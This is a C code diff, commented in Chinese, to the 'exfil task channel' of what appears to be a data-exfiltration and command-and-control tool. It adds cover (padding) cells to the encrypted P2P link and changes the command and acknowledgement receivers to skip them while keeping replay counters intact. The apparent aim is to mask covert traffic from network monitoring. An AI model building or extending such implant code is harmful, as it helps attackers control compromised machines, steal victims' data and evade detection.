@@ -162,6 +162,22 @@ int exfil_task_chan_send_raw(exfil_task_chan_t *ch, int fd,
     return EXF_TASK_OK;
 }
 
+int exfil_task_chan_cover(exfil_task_chan_t *ch, int fd)
+{
+    uint8_t cell[P2P_CELL_WIRE];
+
+    if (!ch || fd < 0) return EXF_TASK_ERR_ARG;
+
+    /* 与数据共用 &ch->cell：counter 单调是硬约束，不得另起上下文 */
+    if (p2p_cell_pack_cover(&ch->cell, cell) != P2P_CELL_OK)
+        return EXF_TASK_ERR_FMT;
+
+    if (exfil_link_write_all(fd, cell, P2P_CELL_WIRE) != 0)
+        return EXF_TASK_ERR_IO;
+
+    return EXF_TASK_OK;
+}
+
 /* ---- 下行：命令 ---- */
 
 int exfil_task_chan_cmd(exfil_task_chan_t *ch, int fd, uint64_t seq,
@@ -209,7 +225,14 @@ int exfil_task_chan_recv_cmd(exfil_task_chan_t *ch, int fd, uint64_t *seq,
     if (r == P2P_CELL_ERR_REPLAY) return EXF_TASK_ERR_REPLAY;
     if (r == P2P_CELL_ERR_AUTH)   return EXF_TASK_ERR_AUTH;
     if (r != P2P_CELL_OK)         return EXF_TASK_ERR_FMT;
-    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* PAD/FIN 不应出现在任务通道 */
+
+    /*
+     * 覆盖信元：counter 已由 cell_unpack 推进（防重放仍然有效），
+     * 但**不推进 seq** —— 覆盖不占用命令序号空间。返回正值 EXF_TASK_PAD，
+     * 调用方继续读下一个。
+     */
+    if (cmd == P2P_CELL_CMD_PAD)  return EXF_TASK_PAD;
+    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* FIN 不应出现在任务通道 */
 
     /* 解包用 kr —— 方向密钥约定，见头文件说明 */
     r = exfil_task_open_cmd(ch->kr, frame, flen, &s, c);
@@ -272,7 +295,10 @@ int exfil_task_chan_recv_ack(exfil_task_chan_t *ch, int fd, uint64_t *seq,
     if (r == P2P_CELL_ERR_REPLAY) return EXF_TASK_ERR_REPLAY;
     if (r == P2P_CELL_ERR_AUTH)   return EXF_TASK_ERR_AUTH;
     if (r != P2P_CELL_OK)         return EXF_TASK_ERR_FMT;
-    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* PAD/FIN 不应出现在任务通道 */
+
+    /* 覆盖信元：counter 已推进，seq 不动（同上） */
+    if (cmd == P2P_CELL_CMD_PAD)  return EXF_TASK_PAD;
+    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* FIN 不应出现在任务通道 */
 
     /* 解包用 kr */
     r = exfil_task_open_ack(ch->kr, frame, flen, &s, a);
